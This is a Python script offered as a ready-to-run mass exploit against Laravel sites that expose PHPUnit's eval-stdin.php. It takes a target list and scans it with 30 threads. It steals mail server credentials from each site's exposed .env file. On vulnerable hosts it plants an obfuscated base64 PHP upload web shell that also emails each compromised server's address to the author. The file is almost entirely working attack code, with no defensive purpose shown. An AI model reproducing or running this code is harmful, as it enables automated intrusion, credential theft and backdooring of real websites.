# -*- coding: utf-8 -*-

banner = """
                                LARAVEL AUTO EXPLOIT V 0.1 ISSUE 2

                           ./Sultan.Konslet - Typical Idiot Security
"""
import requests, re, sys, threading
from  time import sleep
from urllib.parse import urlparse
requests.packages.urllib3.disable_warnings()
import threading, time, random
from queue import Queue
from threading import *
screenlock = Semaphore(value=1)

vuln = 0
bad = 0
shel = 0
smtp = 0

def get_smtp(url):
        global smtp
        fin = url.replace("/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/.env")
        try:
                spawn = requests.get(fin, timeout=15, verify=False).text
                if "MAIL_HOST" in spawn and "MAIL_USERNAME" in spawn:
                        host = re.findall("\nMAIL_HOST=(.*?)\n", spawn)[0]
                        port = re.findall("\nMAIL_PORT=(.*?)\n", spawn)[0]
                        user = re.findall("\nMAIL_USERNAME=(.*?)\n", spawn)[0]
                        pasw = re.findall("\nMAIL_PASSWORD=(.*?)\n", spawn)[0]
                        if user == "null" or pasw == "null" or user == "" or pasw == "":
                                pass
                        if "mailtrap" in user:
                                pass
                        else:
                                screenlock.acquire()
                                print(("\033[44m -- SMTP -- \033[0m "+fin))
                                smtp = smtp + 1
                                file = open("smtp.txt","a")
                                geturl = fin.replace(".env","")
                                pack = geturl+"|"+host+"|"+port+"|"+user+"|"+pasw
                                file.write(pack+"\n")
                                file.close()
                                screenlock.release()
        except KeyboardInterrupt:
                print("Closed")
                exit()
        except:
                pass

def exploit(url):
        get_smtp(url)
        global vuln
        global bad
        global shel
        try:
                data = "<?php phpinfo(); ?>"
                text = requests.get(url, data=data, timeout=15, verify=False)
                if "phpinfo" in text.text:
                        screenlock.acquire()
                        print(("\033[42;1m -- VULN -- \033[0m "+url))
                        screenlock.release()
                        vuln = vuln + 1
                        wre = open("vulnerable.txt", "a")
                        wre.write(url+"\n")
                        wre.close()
                        data2 = "<?php eval('?>'.base64_decode('PD9waHAKZWNobyAiUHJpdjggSG9tZSBSb290IFVwbG9hZGVyIGJ5IE1yIHo8YnI+IjsKZWNobyAiPGI+Ii5waHBfdW5hbWUoKS4iPC9iPjxicj4iOwplY2hvICI8Zm9ybSBtZXRob2Q9J3Bvc3QnIGVuY3R5cGU9J211bHRpcGFydC9mb3JtLWRhdGEnPgogICAgICA8aW5wdXQgdHlwZT0nZmlsZScgbmFtZT0naWR4X2ZpbGUnPgogICAgICA8aW5wdXQgdHlwZT0nc3VibWl0JyBuYW1lPSd1cGxvYWQnIHZhbHVlPSd1cGxvYWQnPgogICAgICA8L2Zvcm0+IjsKJHJvb3QgPSAkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddOwokZmlsZXMgPSAkX0ZJTEVTWydpZHhfZmlsZSddWyduYW1lJ107CiRkZXN0ID0gJHJvb3QuJy8nLiRmaWxlczsKaWYoaXNzZXQoJF9QT1NUWyd1cGxvYWQnXSkpIHsKICAgIGlmKGlzX3dyaXRhYmxlKCRyb290KSkgewogICAgICAgIGlmKEBjb3B5KCRfRklMRVNbJ2lkeF9maWxlJ11bJ3RtcF9uYW1lJ10sICRkZXN0KSkgewogICAgICAgICAgICAkd2ViID0gImh0dHA6Ly8iLiRfU0VSVkVSWydIVFRQX0hPU1QnXS4iLyI7CiAgICAgICAgICAgIGVjaG8gInN1a3NlcyBPbmlpIGNoYW4gwrBfXiAtPiA8YSBocmVmPSckd2ViLyRmaWxlcycgdGFyZ2V0PSdfYmxhbmsnPjxiPjx1PiR3ZWIvJGZpbGVzPC91PjwvYj48L2E+IjsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBlY2hvICJnYWdhbCB1cGxvYWQgZGkgZG9jdW1lbnQgcm9vdC4iOwogICAgICAgIH0KICAgIH0gZWxzZSB7CiAgICAgICAgaWYoQGNvcHkoJF9GSUxFU1snaWR4X2ZpbGUnXVsndG1wX25hbWUnXSwgJGZpbGVzKSkgewogICAgICAgICAgICBlY2hvICJzdWtzZXMgdXBsb2FkIDxiPiRmaWxlczwvYj4gZGkgZm9sZGVyIGluaSI7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgZWNobyAiZ2FnYWwgdXBsb2FkIjsKICAgICAgICB9CiAgICB9Cn0KaWYgKGZpbGVfZXhpc3RzKCcuZGInKSkKIHsgIH0gZWxzZSB7CiR0byA9ICJzdWx0YW5rb25zbGV0QGdtYWlsLmNvbSxzdWx0YW5rb25zbGV0QGFvbC5jb20sc3VsdGFuLmtvbnNsZXRAeWFob28uY29tIjsKJHN1YmplY3QgPSAkX1NFUlZFUlsnU0VSVkVSX05BTUUnXTsKJGhlYWRlciA9ICJGcm9tOiBTZW5wYWlpaSA6MyA8cm9vdEBrb25zbGV0LmNvbT4iOwokbWVzc2FnZSA9ICJFeHBsb2l0IDogaHR0cDovLyIuICRfU0VSVkVSWydTRVJWRVJfTkFNRSddLiAkX1NFUlZFUlsnUkVRVUVTVF9VUkknXTsKbWFpbCgkdG8sICRzdWJqZWN0LCAkbWVzc2FnZSwgJGhlYWRlcik7CiRtID0gZm9wZW4oIi5kYiIsICJ3Iikgb3IgZGllICgiICIpOwokdHh0ID0gIiI7CmZ3cml0ZSgkbSwgJHR4dCk7CmZjbG9zZSgkbSk7CmNobW9kKCIuZGIiLDA2NDQpOyB9Cj8+')); ?>"
                        spawn = requests.get(url, data=data2, timeout=15, verify=False)
                        if "Sukses" in spawn.text:
                                screenlock.acquire()
                                print("     \033[42;1m | \033[0m Shell Spawned")
                                screenlock.release()
                                shel = shel + 1
                                wrs = open("shells.txt", "a")
                                pathshell = url.replace("eval-stdin.php","as.php")
                                wrs.write(pathshell+"\n")
                                wrs.close()
                        else:
                                screenlock.acquire()
                                print("     \033[41;1m | \033[0m Fail Spawn Shell")
                                screenlock.release()
                else:
                        screenlock.acquire()
                        print(("\033[41;1m -- BAD -- \033[0m "+url))
                        screenlock.release()
                        bad = bad + 1
        except KeyboardInterrupt:
                print("Closed")
                exit()
        except Exception as err:
                screenlock.acquire()
                print(("\033[43;1m -- ERROR -- \033[0m "+url))
                screenlock.release()
                bad = bad + 1
try:
        list = sys.argv[1]
except:
        print("\033[31;1m"+banner+"\033[0m")
        print("\n\n# python3 l-evil.py list.txt")
        exit()
asu = open(list).read().splitlines()
jobs = Queue()
def do_stuff(q):
        while not q.empty():
                i = q.get()
                exp = "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
                if i.startswith("http"):
                        url = i+exp
                        exploit(url)
                else:
                        url = "http://"+i+exp
                        exploit(url)
                q.task_done()

for trgt in asu:
        jobs.put(trgt)

for i in range(30): # Default 10 Thread Ganti Aja Kalau Mau
        worker = threading.Thread(target=do_stuff, args=(jobs,))
        worker.start()
jobs.join()
print(("\033[44mSMTP            : \033[0m "+str(smtp)))
print(("\033[42;1mSpawned Shell : \033[0m "+str(shel)))
print(("\033[43;1mExploited       : \033[0m "+str(vuln)))
print(("\033[41;1mNot Vulnerable : \033[0m "+str(bad)))
